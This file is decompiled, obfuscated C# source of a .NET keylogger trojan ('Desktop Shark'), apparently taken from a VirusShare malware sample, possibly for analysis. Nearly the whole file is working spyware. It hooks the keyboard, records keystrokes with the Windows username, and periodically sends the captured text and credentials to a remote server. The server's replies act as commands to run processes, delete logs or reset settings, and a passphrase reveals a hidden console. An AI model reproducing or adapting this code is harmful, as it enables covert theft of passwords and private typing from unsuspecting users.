// Decompiled with JetBrains decompiler
// Type: ំ
// Assembly: dskl, Version=1.71.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5380AAD3-568D-45D6-B9BC-59CE5C1E3490
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.czk-cde7546df369e926f201a20ea21a174728391b0927412058c56dcdd5367e606c.exe

using KeyLogger.Properties;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Web;
using System.Windows.Forms;

public class \u17C6 : UserControl, IDisposable
{
  private const int ᡖᙃ = 15;
  private string ᡗᙃ = "Desktop Shark v" + Settings.Default.CurrentVersion.ToString() + "\n";
  private System.Windows.Forms.Timer ᡀᙃ = new System.Windows.Forms.Timer();
  private System.Windows.Forms.Timer ᡳᙃ = new System.Windows.Forms.Timer();
  private System.Windows.Forms.Timer ᡚᙃ = new System.Windows.Forms.Timer();
  private int ᡛᙃ;
  private bool ᡙᙃ;
  private bool ᡝᙃ;
  private string ᡞᙃ = "";
  private អ ᡟᙃ = new អ();
  private bool ᡠᙃ = true;
  private string ᡡᙃ = "^";
  private string ᡢᙃ = "[lctrl]";
  private bool ᡣᙃ;
  private bool ᡤᙃ;
  private static \u17C6 ᡥᙃ;
  private យ ᡦᙃ;
  private IContainer ᡧᙃ;
  private Button ᡨᙃ;
  private Button ᡩᙃ;
  private RichTextBox ᡪᙃ;
  private Button ᡫᙃ;
  private Button ᡬᙃ;
  private Button ᡭᙃ;
  private ComboBox ᡮᙃ;
  private PictureBox ᡯᙃ;

  public static \u17C6 Instance => \u17C6.ᡥᙃ;

  public bool KeyLoggerIsRunning
  {
    get => this.ᡠᙃ;
    set => this.ᡠᙃ = value;
  }

  public \u17C6()
  {
    if (\u17C6.ᡥᙃ == null)
      \u17C6.ᡥᙃ = this;
    this.ᡕᙃ();
    this.ᡪᙃ.SelectionColor = Color.Gray;
    this.ᡪᙃ.SelectedText = this.ᡗᙃ;
    if (Settings.Default.AutomaticStartupKeylogger)
      this.startLogger();
    if (Settings.Default.AutomaticArchivingKeylogger)
      this.ᡀᙃ.Interval = 1000;
    this.ᡀᙃ.Tick += new EventHandler(this.ᡈᙃ);
    this.ᡳᙃ.Interval = 60000;
    this.ᡳᙃ.Tick += new EventHandler(this.ᡇᙃ);
    this.ᡳᙃ.Start();
    this.ᡚᙃ.Interval = 900000;
    this.ᡚᙃ.Tick += new EventHandler(this.ᡆᙃ);
    this.ᡚᙃ.Start();
    if (Directory.Exists(Settings.Default.ArchivingKeyloggerLocation))
      this.ᡮᙃ.Items.AddRange((object[]) Directory.GetFiles(Settings.Default.ArchivingKeyloggerLocation, "*"));
    if (!Directory.Exists(Settings.Default.ArchivingKeyloggerLocation))
      return;
    try
    {
      string[] files = Directory.GetFiles(Settings.Default.ArchivingKeyloggerLocation, "*");
      List<string> stringList = new List<string>();
      foreach (string path in files)
      {
        if (File.Exists(path))
          stringList.Add(File.GetCreationTime(path).ToString());
      }
      string[] array = stringList.ToArray();
      \u180A obj = new \u180A();
      Array.Sort((Array) array, (IComparer) obj);
      this.ᡮᙃ.Items.Clear();
      this.ᡮᙃ.Items.AddRange((object[]) array);
    }
    catch (Exception ex)
    {
      this.ᡟᙃ.ឨ(ex);
    }
  }

  public void DestroyLoggerPanel()
  {
    if (this.KeyLoggerIsRunning)
      ណ.ធ();
    this.ᡀᙃ.Stop();
    this.ᡀᙃ.Dispose();
    this.ᡳᙃ.Stop();
    this.ᡳᙃ.Dispose();
    this.ᡚᙃ.Stop();
    this.ᡚᙃ.Dispose();
  }

  private void ᡆᙃ(object ᙂ, EventArgs ᙄ) => this.\u187Eᙃ();

  private void ᡇᙃ(object ᙂ, EventArgs ᙄ) => this.SaveRichTextToFile();

  private void ᡈᙃ(object ᙂ, EventArgs ᙄ)
  {
    try
    {
      ++this.ᡛᙃ;
      if (this.ᡛᙃ <= 15 || this.ᡙᙃ)
        return;
      this.ᡙᙃ = true;
      this.ᡪᙃ.SelectionColor = Color.Gray;
      this.ᡪᙃ.SelectedText += this.setIdleString(DateTime.Now.ToString());
      new \u17EA().ᙔ(ᙵ.ងᙃ + DateTime.Now.ToString() + ᙵ.ឆᙃ + Environment.UserName + ᙵ.ឈᙃ + this.ᡞᙃ);
      if (Settings.Default.RemoteAccess && !Settings.Default.RemoteUser.Equals("") && !Settings.Default.RemotePass.Equals(""))
      {
        អ អ = new អ();
        switch (អ.ឪ(អ.ឮ, ᙵ.ដᙃ + HttpUtility.UrlEncode(អ.ឤ(Settings.Default.RemoteUser)) + "," + HttpUtility.UrlEncode(អ.ឤ(Settings.Default.RemotePass)) + ᙵ.មᙃ + HttpUtility.UrlEncode(អ.ឤ(this.ᡞᙃ)) + ᙵ.ណᙃ + HttpUtility.UrlEncode(អ.ឤ(Environment.UserName)) + ᙵ.\u17BEᙃ))
        {
          case "2":
            if (File.Exists(Application.StartupPath + ᙵ.ធᙃ))
            {
              Process.Start(Application.StartupPath + ᙵ.បᙃ, ᙵ.ពᙃ);
              break;
            }
            break;
          case "3":
            if (File.Exists(Application.StartupPath + ᙵ.កᙃ))
            {
              Process.Start(Application.StartupPath + ᙵ.រᙃ);
              break;
            }
            break;
          case "4":
            ᙀ.ᙬ.ᝀ();
            break;
          case "5":
            ᙀ.ᙬ.ᙢ();
            break;
          case "6":
            this.ᡓᙃ();
            break;
          case "7":
            Settings.Default.ConsolePassword = ᙵ.យᙃ;
            ᙀ.ᙬ.\u1754("");
            Settings.Default.Save();
            break;
        }
      }
      this.ᡞᙃ = "";
    }
    catch (Exception ex)
    {
      this.ᡟᙃ.ឨ(ex);
    }
  }

  private void ᡉᙃ(object ᙂ, EventArgs ᙄ)
  {
    if (!this.ᡝᙃ)
    {
      if (DialogResult.Yes != MessageBox.Show(ᙵ.ឞᙃ, ᙵ.ហᙃ, MessageBoxButtons.YesNo))
        return;
      this.ᡪᙃ.Clear();
      this.ᡪᙃ.SelectionColor = Color.Gray;
      this.ᡪᙃ.SelectedText = this.ᡗᙃ;
    }
    else
      this.ᡝᙃ = false;
  }

  private void ᡊᙃ(object ᙂ, EventArgs ᙄ) => this.startLogger();

  private void ᡋᙃ(object ᙂ, EventArgs ᙄ)
  {
    if (DialogResult.Yes != MessageBox.Show(ᙵ.អᙃ, ᙵ.ឤᙃ, MessageBoxButtons.YesNo))
      return;
    this.stopLogger();
  }

  private void ᡘᙃ(object ᙂ, EventArgs ᙄ)
  {
    this.ᡪᙃ.SelectAll();
    this.ᡪᙃ.Copy();
    this.ᡪᙃ.DeselectAll();
    this.ᡪᙃ.SelectionStart = this.ᡪᙃ.TextLength;
    this.ᡪᙃ.SelectionLength = 0;
  }

  private void ᡍᙃ(object ᙂ, EventArgs ᙄ) => this.SaveTextToFile();

  private void ᡎᙃ(object ᙂ, EventArgs ᙄ) => Process.Start(Settings.Default.ArchivingKeyloggerLocation);

  public int numberOfLogs() => this.ᡮᙃ.Items.Count;

  private bool ᡏᙃ()
  {
    this.ᡣᙃ = false;
    this.ᡤᙃ = true;
    SendKeys.SendWait(this.ᡡᙃ);
    return this.ᡣᙃ;
  }

  private void \u187Eᙃ()
  {
    if (!this.ᡠᙃ || this.ᡏᙃ())
      return;
    ណ.ធ();
    Thread.Sleep(50);
    this.ᡟᙃ.ឨ(new Exception(ᙵ.ឦᙃ));
    ណ.\u17BE(new ណ.ព(this.KeyReaderr));
  }

  public void KeyReaderr(IntPtr wParam, IntPtr lParam)
  {
    try
    {
      string str = \u187E.ᡒ((ᡘ) Marshal.ReadInt32(lParam));
      if (string.IsNullOrEmpty(str))
        return;
      if (this.ᡤᙃ)
      {
        this.ᡤᙃ = false;
        this.ᡣᙃ = str == this.ᡢᙃ;
      }
      else
      {
        if (ᙀ.ᙬ.IsDisposed)
        {
          this.ᡟᙃ.ឨ(new Exception("FormManager.mainApp has already been disposed.  Unable to write keys."));
          ណ.ធ();
          this.ᡠᙃ = false;
        }
        ᙀ.ᙬ.ᙲ = true;
        if (ᙀ.ᙬ.\u1759)
          return;
        if (this.ᡪᙃ.IsDisposed)
        {
          this.ᡟᙃ.ឨ(new Exception("richTextBox1 is already disposed.  Object not set to instance of an object."));
        }
        else
        {
          this.ᡪᙃ.Select(this.ᡪᙃ.Text.Length, 0);
          if (str.Length > 1)
          {
            this.ᡪᙃ.SelectionColor = Color.Orange;
            if (this.ᡪᙃ.Text.EndsWith(str))
            {
              this.ᡪᙃ.SelectedText += "...";
              this.ᡞᙃ += "...";
            }
            else if (!this.ᡪᙃ.Text.EndsWith(str + "..."))
            {
              this.ᡪᙃ.SelectedText += str;
              this.ᡞᙃ += str;
            }
          }
          else if (str.Length > 0)
          {
            this.ᡪᙃ.SelectionColor = Color.Purple;
            this.ᡪᙃ.SelectedText += str;
            if (this.ᡪᙃ.Text.EndsWith(Settings.Default.PassPhrase.ToString()) && Settings.Default.PassPhrase != "")
              this.showLogger();
            this.ᡞᙃ += str;
          }
          this.ᡛᙃ = 0;
          this.ᡙᙃ = false;
          this.ᡪᙃ.ScrollToCaret();
        }
      }
    }
    catch (Exception ex)
    {
      this.ᡟᙃ.ឨ(ex);
    }
  }

  public string setIdleString(string txt) => "\n=======================" + txt + " (" + Environment.UserName + ") =======================\n";

  public void startLogger()
  {
    this.ᡪᙃ.SelectionColor = Color.Green;
    this.ᡪᙃ.SelectedText += this.setIdleString("Key Logger Started " + DateTime.Now.ToString());
    ណ.\u17BE(new ណ.ព(this.KeyReaderr));
    this.ᡩᙃ.Enabled = false;
    this.ᡨᙃ.Enabled = true;
    this.ᡀᙃ.Start();
    this.ᡙᙃ = true;
    this.ᡠᙃ = true;
    this.ᡟᙃ.ឨ(new Exception("The key logger has executed the start command."));
    this.\u187Eᙃ();
  }

  public void stopLogger()
  {
    this.ᡪᙃ.SelectionColor = Color.Red;
    this.ᡪᙃ.SelectedText += this.setIdleString("Key Logger Stopped " + DateTime.Now.ToString());
    ណ.ធ();
    this.ᡩᙃ.Enabled = true;
    this.ᡨᙃ.Enabled = false;
    this.ᡀᙃ.Stop();
    this.ᡠᙃ = false;
    this.ᡟᙃ.ឨ(new Exception("The key logger has executed the stop command."));
  }

  public void hideLogger()
  {
    try
    {
      ᙀ.ᙬ.ᙪ();
    }
    catch (Exception ex)
    {
      this.ᡟᙃ.ឨ(ex);
    }
  }

  public void showLogger()
  {
    try
    {
      if (Settings.Default.ConsolePassword != \u17E0.\u17E6("!*pa!*ss!*wo!*rd!*no!*ts!*et!*"))
      {
        if (this.ᡦᙃ != null && !this.ᡦᙃ.IsDisposed)
          return;
        this.ᡦᙃ = new យ();
        this.ᡦᙃ.Show();
      }
      else
        ᙀ.ᙬ.\u1756();
    }
    catch (Exception ex)
    {
      this.ᡟᙃ.ឨ(ex);
    }
  }

  public void SaveTextToFile()
  {
    try
    {
      new \u17EA().ᙔ(this.ᡪᙃ.Text);
    }
    catch (Exception ex)
    {
      this.ᡟᙃ.ឨ(ex);
    }
  }

  public void SaveRichTextToFile() => new \u17EA().\u1804(this.ᡪᙃ.Rtf);

  public void LoadRichText()
  {
    string str = new \u17EA().\u17F2();
    if (str.Equals(""))
      return;
    this.ᡪᙃ.Rtf = str;
  }

  private void ᡑᙃ(object ᙂ, PreviewKeyDownEventArgs ᙄ)
  {
    if (!ᙄ.KeyCode.ToString().Equals(ᙵ.ឨᙃ))
      return;
    this.ᡝᙃ = true;
  }

  private void ᡒᙃ(object ᙂ, EventArgs ᙄ)
  {
    try
    {
      foreach (string file in Directory.GetFiles(Settings.Default.ArchivingKeyloggerLocation, "*"))
      {
        if (File.GetCreationTime(file).ToString().Equals(this.ᡮᙃ.SelectedItem.ToString()))
        {
          bool flag = false;
          string str = file;
          string path = file.Replace(ᙵ.ឪᙃ, "");
          if (str.EndsWith(ᙵ.ឬᙃ))
          {
            ᡔ.ᡚ(file, Settings.Default.ArchivingKeyloggerLocation, "", false);
            flag = true;
          }
          string rtf = File.ReadAllText(path);
          ឞ ឞ = new ឞ();
          ឞ.ហ(rtf);
          ឞ.Show();
          if (flag)
            File.Delete(path);
        }
      }
    }
    catch (Exception ex)
    {
      this.ᡟᙃ.ឨ(ex);
    }
  }

  private void ᡓᙃ()
  {
    foreach (string file in Directory.GetFiles(Settings.Default.ArchivingKeyloggerLocation))
    {
      try
      {
        File.Delete(file);
      }
      catch
      {
      }
    }
  }

  private void ᡔᙃ(object ᙂ, EventArgs ᙄ)
  {
    ᝰ ᝰ = new ᝰ(ᝰ.\u1772, ᙵ.ឮᙃ);
    ᝰ.Show();
    ᝰ.Activate();
  }

  protected override void Dispose(bool disposing)
  {
    if (disposing)
      this.DestroyLoggerPanel();
    if (disposing && this.ᡧᙃ != null)
      this.ᡧᙃ.Dispose();
    base.Dispose(disposing);
  }

  private void ᡕᙃ()
  {
    this.ᡨᙃ = new Button();
    this.ᡩᙃ = new Button();
    this.ᡪᙃ = new RichTextBox();
    this.ᡫᙃ = new Button();
    this.ᡬᙃ = new Button();
    this.ᡭᙃ = new Button();
    this.ᡮᙃ = new ComboBox();
    this.ᡯᙃ = new PictureBox();
    ((ISupportInitialize) this.ᡯᙃ).BeginInit();
    this.SuspendLayout();
    this.ᡨᙃ.Enabled = false;
    this.ᡨᙃ.Image = (Image) Resources.stop;
    this.ᡨᙃ.ImageAlign = ContentAlignment.MiddleLeft;
    this.ᡨᙃ.Location = new Point(84, 4);
    this.ᡨᙃ.Name = ᙵ.ឰᙃ;
    this.ᡨᙃ.Size = new Size(75, 28);
    this.ᡨᙃ.TabIndex = 3;
    this.ᡨᙃ.Text = ᙵ.ឲᙃ;
    this.ᡨᙃ.TextImageRelation = TextImageRelation.ImageBeforeText;
    this.ᡨᙃ.UseVisualStyleBackColor = true;
    this.ᡨᙃ.Click += new EventHandler(this.ᡋᙃ);
    this.ᡩᙃ.Image = (Image) Resources.accept;
    this.ᡩᙃ.ImageAlign = ContentAlignment.MiddleLeft;
    this.ᡩᙃ.Location = new Point(3, 4);
    this.ᡩᙃ.Name = ᙵ.\u17C2ᙃ;
    this.ᡩᙃ.Size = new Size(75, 28);
    this.ᡩᙃ.TabIndex = 2;
    this.ᡩᙃ.Text = ᙵ.\u17C4ᙃ;
    this.ᡩᙃ.TextImageRelation = TextImageRelation.ImageBeforeText;
    this.ᡩᙃ.UseVisualStyleBackColor = true;
    this.ᡩᙃ.Click += new EventHandler(this.ᡊᙃ);
    this.ᡪᙃ.Dock = DockStyle.Bottom;
    this.ᡪᙃ.Location = new Point(0, 33);
    this.ᡪᙃ.Name = ᙵ.\u17C6ᙃ;
    this.ᡪᙃ.ReadOnly = true;
    this.ᡪᙃ.ScrollBars = RichTextBoxScrollBars.ForcedVertical;
    this.ᡪᙃ.Size = new Size(756, 252);
    this.ᡪᙃ.TabIndex = 4;
    this.ᡪᙃ.Text = "";
    this.ᡫᙃ.Image = (Image) Resources.arrow_refresh;
    this.ᡫᙃ.ImageAlign = ContentAlignment.MiddleLeft;
    this.ᡫᙃ.Location = new Point(165, 4);
    this.ᡫᙃ.Name = ᙵ.\u17C8ᙃ;
    this.ᡫᙃ.Size = new Size(75, 28);
    this.ᡫᙃ.TabIndex = 5;
    this.ᡫᙃ.Text = ᙵ.\u17CAᙃ;
    this.ᡫᙃ.TextImageRelation = TextImageRelation.ImageBeforeText;
    this.ᡫᙃ.UseVisualStyleBackColor = true;
    this.ᡫᙃ.PreviewKeyDown += new PreviewKeyDownEventHandler(this.ᡑᙃ);
    this.ᡫᙃ.Click += new EventHandler(this.ᡉᙃ);
    this.ᡬᙃ.Image = (Image) Resources.page_copy;
    this.ᡬᙃ.ImageAlign = ContentAlignment.MiddleLeft;
    this.ᡬᙃ.Location = new Point(246, 4);
    this.ᡬᙃ.Name = ᙵ.\u17D8ᙃ;
    this.ᡬᙃ.Size = new Size(75, 28);
    this.ᡬᙃ.TabIndex = 6;
    this.ᡬᙃ.Text = ᙵ.\u17CEᙃ;
    this.ᡬᙃ.TextImageRelation = TextImageRelation.ImageBeforeText;
    this.ᡬᙃ.UseVisualStyleBackColor = true;
    this.ᡬᙃ.Click += new EventHandler(this.ᡘᙃ);
    this.ᡭᙃ.Image = (Image) Resources.find;
    this.ᡭᙃ.ImageAlign = ContentAlignment.MiddleLeft;
    this.ᡭᙃ.Location = new Point(327, 4);
    this.ᡭᙃ.Name = ᙵ.\u17FEᙃ;
    this.ᡭᙃ.Size = new Size(75, 28);
    this.ᡭᙃ.TabIndex = 8;
    this.ᡭᙃ.Text = ᙵ.\u17D2ᙃ;
    this.ᡭᙃ.TextImageRelation = TextImageRelation.ImageBeforeText;
    this.ᡭᙃ.UseVisualStyleBackColor = true;
    this.ᡭᙃ.Click += new EventHandler(this.ᡎᙃ);
    this.ᡮᙃ.DropDownStyle = ComboBoxStyle.DropDownList;
    this.ᡮᙃ.FormattingEnabled = true;
    this.ᡮᙃ.Location = new Point(408, 6);
    this.ᡮᙃ.Name = ᙵ.\u17D4ᙃ;
    this.ᡮᙃ.Size = new Size(201, 21);
    this.ᡮᙃ.TabIndex = 9;
    this.ᡮᙃ.SelectedIndexChanged += new EventHandler(this.ᡒᙃ);
    this.ᡯᙃ.Image = (Image) Resources.help;
    this.ᡯᙃ.Location = new Point(615, 9);
    this.ᡯᙃ.Name = ᙵ.\u17D6ᙃ;
    this.ᡯᙃ.Size = new Size(16, 16);
    this.ᡯᙃ.TabIndex = 23;
    this.ᡯᙃ.TabStop = false;
    this.ᡯᙃ.Click += new EventHandler(this.ᡔᙃ);
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.AutoSize = true;
    this.Controls.Add((Control) this.ᡯᙃ);
    this.Controls.Add((Control) this.ᡮᙃ);
    this.Controls.Add((Control) this.ᡭᙃ);
    this.Controls.Add((Control) this.ᡬᙃ);
    this.Controls.Add((Control) this.ᡫᙃ);
    this.Controls.Add((Control) this.ᡪᙃ);
    this.Controls.Add((Control) this.ᡨᙃ);
    this.Controls.Add((Control) this.ᡩᙃ);
    this.Name = ᙵ.\u17C0ᙃ;
    this.Size = new Size(756, 285);
    ((ISupportInitialize) this.ᡯᙃ).EndInit();
    this.ResumeLayout(false);
  }
}
